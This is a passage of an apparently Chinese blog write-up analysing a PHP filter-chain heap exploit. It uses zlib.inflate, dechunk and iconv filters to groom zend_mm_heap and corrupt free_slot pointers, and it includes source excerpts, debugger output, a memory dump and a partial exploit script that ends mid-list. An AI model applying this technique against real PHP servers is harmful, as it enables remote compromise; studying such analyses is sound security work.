</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*buf;
</span><span style="color:#c0c5ce;">	size_t buflen;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* if non-zero, buf should be pefreed when the bucket is destroyed */
</span><span style="color:#c0c5ce;">	uint8_t own_buf;
</span><span style="color:#c0c5ce;">	uint8_t is_persistent;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* destroy this struct when refcount falls to zero */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> refcount;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">_php_stream_bucket_brigade {
</span><span style="color:#c0c5ce;">	php_stream_bucket *head, *tail;
</span><span style="color:#c0c5ce;">};
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* read a chunk into a bucket */
</span><span style="color:#c0c5ce;">	justread = stream-&gt;ops-&gt;</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(stream, chunk_buf, stream-&gt;chunk_size);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(justread &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; stream-&gt;writepos == stream-&gt;readpos) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">efree</span><span style="color:#c0c5ce;">(chunk_buf);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> FAILURE;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(justread &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		bucket = </span><span style="color:#8fa1b3;">php_stream_bucket_new</span><span style="color:#c0c5ce;">(stream, chunk_buf, justread, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* after this call, bucket is owned by the brigade */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">php_stream_bucket_append</span><span style="color:#c0c5ce;">(brig_inp, bucket);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		flags = stream-&gt;eof ? PSFS_FLAG_FLUSH_CLOSE : PSFS_FLAG_NORMAL;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		flags = stream-&gt;eof ? PSFS_FLAG_FLUSH_CLOSE : PSFS_FLAG_FLUSH_INC;
</span><span style="color:#c0c5ce;">	}
</span></pre>
<p>eg. 一个包含/etc/passwd的3桶接力队列
<img src="./images/Pasted%20image%2020250515150918.png" alt="" /></p>
<p>接着在这上面应用过滤器，会按顺序处理各个bucket
<img src="./images/Pasted%20image%2020250515150956.png" alt="" /></p>
<p>问题：只创建一个bucket
解决：<code>zlib.inflate</code>
该过滤器接收流并进行解压缩处理，会分配0x8000字节（8页）的缓冲区并将流膨胀至其中。如果这个缓冲区不足以容纳全部数据，将再创建一个相同大小的新缓存区域以存储剩余部分；若前两者还不够用，还会继续增加。每次扩充出来的区块都会加入各自的bucket中。</p>
<blockquote>
<p><code>inflate()</code>位于<code>libz.so.1.2.11</code>库，函数调用php中的<code>php_zlib_alloc()</code>函数，内部申请0x8000大小chunk</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">─────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────
</span><span style="color:#c0c5ce;">   0x7f32caeb76d6 &lt;inflate+2038&gt;    mov    esi, 1                          ESI =&gt; 1
</span><span style="color:#c0c5ce;">   0x7f32caeb76db &lt;inflate+2043&gt;    mov    qword ptr [rsp], r11
</span><span style="color:#c0c5ce;">   0x7f32caeb76df &lt;inflate+2047&gt;    mov    edx, 1                          EDX =&gt; 1
</span><span style="color:#c0c5ce;">   0x7f32caeb76e4 &lt;inflate+2052&gt;    mov    rdi, qword ptr [rax + 0x50]
</span><span style="color:#c0c5ce;">   0x7f32caeb76e8 &lt;inflate+2056&gt;    shl    esi, cl
</span><span style="color:#c0c5ce;"> ► 0x7f32caeb76ea &lt;inflate+2058&gt;    call   qword ptr [rax + 0x40]      &lt;php_zlib_alloc&gt;
</span><span style="color:#c0c5ce;">        rdi: 0x7f32c886f0a0 —▸ 0x7f32c8891081 ◂— 0
</span><span style="color:#c0c5ce;">        rsi: 0x8000
</span><span style="color:#c0c5ce;">        rdx: 1
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">   0x7f32caeb76ed &lt;inflate+2061&gt;    mov    r11, qword ptr [rsp]
</span><span style="color:#c0c5ce;">   0x7f32caeb76f1 &lt;inflate+2065&gt;    test   rax, rax
</span><span style="color:#c0c5ce;">   0x7f32caeb76f4 &lt;inflate+2068&gt;    mov    qword ptr [rbx + 0x48], rax
</span><span style="color:#c0c5ce;">   0x7f32caeb76f8 &lt;inflate+2072&gt;    mov    rdi, rax
</span><span style="color:#c0c5ce;">   0x7f32caeb76fb &lt;inflate+2075&gt;    jne    inflate+1641                &lt;inflate+1641&gt;
</span><span style="color:#c0c5ce;">─────────────[ STACK ]───────────
</span><span style="color:#c0c5ce;">...
</span><span style="color:#c0c5ce;">───────────[ BACKTRACE ]───────────
</span><span style="color:#c0c5ce;"> ► 0   0x7f32caeb76ea inflate+2058
</span><span style="color:#c0c5ce;">   1   0x559edb4edc7e php_zlib_inflate_filter+222
</span><span style="color:#c0c5ce;">   2   0x559edb66c567 _php_stream_fill_read_buffer+311
</span><span style="color:#c0c5ce;">   3   0x559edb66c909 _php_stream_read+185
</span><span style="color:#c0c5ce;">   4   0x559edb66df51 _php_stream_copy_to_mem+385
</span><span style="color:#c0c5ce;">   5   0x559edb5ed4bb zif_file_get_contents+363
</span><span style="color:#c0c5ce;">   6   0x559edb56b01c phar_file_get_contents+236
</span><span style="color:#c0c5ce;">   7   0x559edb72651a execute_ex+13434
</span></pre>
<p><img src="./images/Pasted%20image%2020250515160104.png" alt="" /></p>
<h3 id="fen-kuai">分块</h3><p>HTTP-chunked编码
先一个ASCII十六进制表示大小，一个换行符
然后是对应大小的数据块，再一个换行符
dechunk即进行相反的操作，对HTTP-chunked编码的块进行解码
<img src="./images/Pasted%20image%2020250515160148.png" alt="" /></p>
<p>但是下面这种方法来构造多个chunk行不通
因为尽管bucket被单独处理，但并不独立：所有bucket被解析成一个大stream，当dechunk过滤器处理流的时候，会读取第一个bucket的大小，之后读到大小为零的值，则会停止解析，不会处理到第二个bucket。
<img src="./images/Pasted%20image%2020250515161346.png" alt="" />
如果读到0，就直接结束解析</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> CHUNK_SIZE_LF:
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*p == &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#c0c5ce;">		p++;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(data-&gt;chunk_size == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* last chunk */
</span><span style="color:#c0c5ce;">			data-&gt;state = CHUNK_TRAILER;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(p == end) {
</span><span style="color:#c0c5ce;">			data-&gt;state = CHUNK_BODY;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> out_len;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		data-&gt;state = CHUNK_ERROR;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">...
</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> CHUNK_TRAILER:
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* ignore trailer */
</span><span style="color:#c0c5ce;">	p = end;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span></pre>
<p>绕过方法：在大小前面填充大量的0（不会增加size同时填充了长度，最后则不需要使用0结束）
<img src="./images/Pasted%20image%2020250515162045.png" alt="" /></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">...
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*p &gt;= &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39; &amp;&amp; *p &lt;= &#39;</span><span style="color:#a3be8c;">9</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#c0c5ce;">	data-&gt;chunk_size = (data-&gt;chunk_size * </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">) + (*p - &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">...
</span></pre>
<p>更详细的代码记录：
<code>dechunk</code> 解码chunked编码数据 相关代码如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> php_stream_filter_ops chunked_filter_ops = {
</span><span style="color:#c0c5ce;">	php_chunked_filter,
</span><span style="color:#c0c5ce;">	php_chunked_dtor,
</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p><code>php_chunked_filter()</code>中<code>php_dechunk()</code>函数识别编码数据块大小 调整<code>bucket-&gt;buflen</code></p>
<p>使用iconv进行编码转换 涉及函数指针<code>php_iconv_stream_filter_do_filter</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> php_stream_filter_ops php_iconv_stream_filter_ops = {
</span><span style="color:#c0c5ce;">	php_iconv_stream_filter_do_filter,
</span><span style="color:#c0c5ce;">	php_iconv_stream_filter_cleanup,
</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">convert.iconv.*</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>先<code>php_stream_bucket_unlink()</code>解链
<code>php_iconv_stream_filter_append_bucket()</code> 调用<code>iconv()</code>进行编码转换 内部根据<code>bucket-&gt;buflen</code>重新申请内存 并将处理结果存储到<code>out_buf</code>
调用<code>php_stream_bucket_new()</code>，<code>out_buf</code>作为内容创建新的bucket，最后再用<code>php_stream_bucket_append()</code>附加到<code>buckets_out</code>中
并且，对取出处理的<code>bucket</code>，采取释放内存操作<code>php_stream_bucket_delref()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* {{{ php_iconv_stream_filter_do_filter */
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> php_stream_filter_status_t </span><span style="color:#8fa1b3;">php_iconv_stream_filter_do_filter</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">		php_stream *</span><span style="color:#bf616a;">stream</span><span style="color:#c0c5ce;">, php_stream_filter *</span><span style="color:#bf616a;">filter</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		php_stream_bucket_brigade *</span><span style="color:#bf616a;">buckets_in</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		php_stream_bucket_brigade *</span><span style="color:#bf616a;">buckets_out</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		size_t *</span><span style="color:#bf616a;">bytes_consumed</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	php_stream_bucket *bucket = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	size_t consumed = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	php_iconv_stream_filter *self = (php_iconv_stream_filter *)</span><span style="color:#8fa1b3;">Z_PTR</span><span style="color:#c0c5ce;">(filter-&gt;abstract);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(buckets_in-&gt;head != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		bucket = buckets_in-&gt;head;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">php_stream_bucket_unlink</span><span style="color:#c0c5ce;">(bucket); </span><span style="color:#65737e;">// 解链
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">php_iconv_stream_filter_append_bucket</span><span style="color:#c0c5ce;">(self, stream, filter,
</span><span style="color:#c0c5ce;">				buckets_out, bucket-&gt;buf, bucket-&gt;buflen, &amp;consumed,
</span><span style="color:#c0c5ce;">				</span><span style="color:#8fa1b3;">php_stream_is_persistent</span><span style="color:#c0c5ce;">(stream)) != SUCCESS) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_failure;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">php_stream_bucket_delref</span><span style="color:#c0c5ce;">(bucket);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(flags != PSFS_FLAG_NORMAL) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">php_iconv_stream_filter_append_bucket</span><span style="color:#c0c5ce;">(self, stream, filter,
</span><span style="color:#c0c5ce;">				buckets_out, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;consumed,
</span><span style="color:#c0c5ce;">				</span><span style="color:#8fa1b3;">php_stream_is_persistent</span><span style="color:#c0c5ce;">(stream)) != SUCCESS) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_failure;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bytes_consumed != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		*bytes_consumed = consumed;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> PSFS_PASS_ON;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">out_failure:
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bucket != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">php_stream_bucket_delref</span><span style="color:#c0c5ce;">(bucket);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> PSFS_ERR_FATAL;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#65737e;">/* }}} */
</span></pre>
<p><code>php_iconv_stream_filter_append_bucket()</code>函数代码如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* {{{ php_iconv_stream_filter_append_bucket */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">php_iconv_stream_filter_append_bucket</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">		php_iconv_stream_filter *</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		php_stream *</span><span style="color:#bf616a;">stream</span><span style="color:#c0c5ce;">, php_stream_filter *</span><span style="color:#bf616a;">filter</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		php_stream_bucket_brigade *</span><span style="color:#bf616a;">buckets_out</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">ps</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">buf_len</span><span style="color:#c0c5ce;">, size_t *</span><span style="color:#bf616a;">consumed</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">persistent</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	php_stream_bucket *new_bucket;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*out_buf = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	size_t out_buf_size;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*pd, *pt;
</span><span style="color:#c0c5ce;">	size_t ocnt, prev_ocnt, icnt, tcnt;
</span><span style="color:#c0c5ce;">	size_t initial_out_buf_size;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ps == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		initial_out_buf_size = </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		icnt = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		initial_out_buf_size = buf_len;
</span><span style="color:#c0c5ce;">		icnt = buf_len;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	out_buf_size = ocnt = prev_ocnt = initial_out_buf_size;
</span><span style="color:#c0c5ce;">	out_buf = </span><span style="color:#8fa1b3;">pemalloc</span><span style="color:#c0c5ce;">(out_buf_size, persistent);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	pd = out_buf;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(self-&gt;stub_len &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		pt = self-&gt;stub;
</span><span style="color:#c0c5ce;">		tcnt = self-&gt;stub_len;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(tcnt &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">iconv</span><span style="color:#c0c5ce;">(self-&gt;cd, &amp;pt, &amp;tcnt, &amp;pd, &amp;ocnt) == (size_t)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">				</span><span style="color:#65737e;">// ...
</span><span style="color:#c0c5ce;">				}
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">			prev_ocnt = ocnt;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">memmove</span><span style="color:#c0c5ce;">(self-&gt;stub, pt, tcnt);
</span><span style="color:#c0c5ce;">		self-&gt;stub_len = tcnt;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(icnt &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((ps == </span><span style="color:#d08770;">NULL </span><span style="color:#c0c5ce;">? </span><span style="color:#8fa1b3;">iconv</span><span style="color:#c0c5ce;">(self-&gt;cd, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &amp;pd, &amp;ocnt):
</span><span style="color:#c0c5ce;">					</span><span style="color:#8fa1b3;">iconv</span><span style="color:#c0c5ce;">(self-&gt;cd, (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**)&amp;ps, &amp;icnt, &amp;pd, &amp;ocnt)) == (size_t)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">// ...
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">		} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ps == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">		prev_ocnt = ocnt;
</span><span style="color:#c0c5ce;">	</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 缓冲区大小 大于 剩余可用空间大小
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 创建新bucket 否则未使用 释放out_buf
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(out_buf_size &gt; ocnt) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL </span><span style="color:#c0c5ce;">== (new_bucket = </span><span style="color:#8fa1b3;">php_stream_bucket_new</span><span style="color:#c0c5ce;">(stream, out_buf, (out_buf_size - ocnt), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, persistent))) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_failure;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">php_stream_bucket_append</span><span style="color:#c0c5ce;">(buckets_out, new_bucket);
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">pefree</span><span style="color:#c0c5ce;">(out_buf, persistent);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	*consumed += buf_len - icnt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SUCCESS;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">out_failure:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">pefree</span><span style="color:#c0c5ce;">(out_buf, persistent);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> FAILURE;
</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span></pre>
<p>思路：通过分配0x100chunk，先连续3个chunk，再反向链入free_slot，之后通过溢出修改next指针低字节，伪造free_slot链表，做任意地址申请
<img src="./images/Pasted%20image%2020250515171258.png" alt="" /></p>
<p>通过套娃的方式构造HTTP-chunked数据，起到控制指定大小堆块申请和释放的效果：配合dechunk+iconv.convert.xxxx.xxx，会先申请当前数据长度对应堆块，之后处理嵌套数据时，则会释放上一次申请的堆块
<img src="./images/Pasted%20image%2020250516102017.png" alt="" /></p>
<p>关于poc中的latin1：
convert.iconv.x.x过滤器调用的是php_iconv_stream_filter_do_filter函数，进过分析发现，在该函数中输出的buffer会根据buflen对堆进行重新分配。例如，输出的buffer是一个0x8000的堆，但是buflen=0x100，那么就会根据该长度申请一个新的堆作为iconv的输出。经过iconv编码转换，由于输入输出的编码相同，所以输出数据不变，但堆的大小会发生变化。</p>
<p>通过上述分析可以发现，在PoC中组合使用dechunk和convert.iconv.latin1.latin1的原因是因为这样可以控制获取任意大小的堆。通过dechunk将buflen设置为0x8000以下的任意值，然后使用convert.iconv.latin1.latin1把堆修改为相应的size。除了可以分配任意size的堆，还可以把任意size的堆放入free_slot中。</p>
<p>通过溢出修改<code>next_free_slot</code>指针 内存图如下
<code>0x7f5aaba8c300</code>处低字节被改为0x48
则只需要在对应位置布置好指向<code>_zend_mm_heap</code>结构的指针 即可覆盖free_slot扩展任意地址申请的能力</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">0x7f5aaba8c200: 0x00007f5aaba8c300      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c210: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c220: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c230: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c240: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c250: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c260: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c270: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c280: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c290: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2a0: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2b0: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2c0: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2d0: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2e0: 0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c2f0: 0x0000000000000000      0x2a241b0000000000
</span><span style="color:#c0c5ce;">0x7f5aaba8c300: 0x00007f5aaba8c148      0x4242424242424242
</span><span style="color:#c0c5ce;">0x7f5aaba8c310: 0x4242424242424242      0x4242424242424242
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">pages = (
</span><span style="color:#c0c5ce;">	step4 * 3
</span><span style="color:#c0c5ce;">	+ step4_pwn
</span><span style="color:#c0c5ce;">	+ step4_custom_heap
</span><span style="color:#c0c5ce;">	+ step4_use_custom_heap
</span><span style="color:#c0c5ce;">	+ step3_overflow
</span><span style="color:#c0c5ce;">	# + pad * self.pad
</span><span style="color:#c0c5ce;">	+ step1 * 3
</span><span style="color:#c0c5ce;">	+ step2_write_ptr
</span><span style="color:#c0c5ce;">	+ step2 * 2
</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">filters = [
</span><span style="color:#c0c5ce;">	# Create buckets
</span><span style="color:#c0c5ce;">	&quot;zlib.inflate&quot;,
</span><span style="color:#c0c5ce;">	&quot;zlib.inflate&quot;,
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	### step1 申请3个0x100 A B C
</span><span style="color:#c0c5ce;">	# Step 0: Setup heap
</span><span style="color:#c0c5ce;">	&quot;dechunk&quot;,
</span><span style="color:#c0c5ce;">	&quot;convert.iconv.L1.L1&quot;, 
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	### step1 释放3个0x100 C-&gt;B-&gt;A;
</span><span style="color:#c0c5ce;">    ### step2_write_ptr 申请C 布置指针
</span><span style="color:#c0c5ce;">    ### step2 申请2个0x100 B A
</span><span style="color:#c0c5ce;">	# Step 1: Reverse FL order
</span><span style="color:#c0c5ce;">	&quot;dechunk&quot;,
</span><span style="color:#c0c5ce;">	&quot;convert.iconv.L1.L1&quot;, 
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	### step2_write_ptr 释放C
